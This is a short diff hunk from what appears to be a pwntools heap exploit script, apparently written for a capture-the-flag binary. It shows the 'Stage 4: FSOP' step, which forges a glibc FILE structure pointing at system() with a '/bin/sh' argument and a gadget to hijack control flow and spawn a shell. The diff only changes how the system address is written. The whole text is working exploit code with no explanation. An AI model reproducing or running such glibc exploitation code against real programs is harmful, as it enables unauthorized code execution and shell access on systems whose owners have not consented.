@@ -55,7 +55,7 @@ malloc(12, 0xf8)
 # Stage 4: FSOP
 fake = FileStructure(0)
 fake.flags = 0x3b01010101010101
-fake._IO_read_end = glibc_e.symbols['system']+glibc_base_addr
+fake._IO_read_end = glibc_base_addr+glibc_e.sym.system
 fake._IO_write_end = u64(b'/bin/sh\x00')
 fake._IO_save_base = glibc_base_addr+next(glibc_e.search(asm('add rdi, 0x10; jmp rcx;')))
 fake._lock = glibc_base_addr+glibc_e.symbols['_IO_stdfile_1_lock']
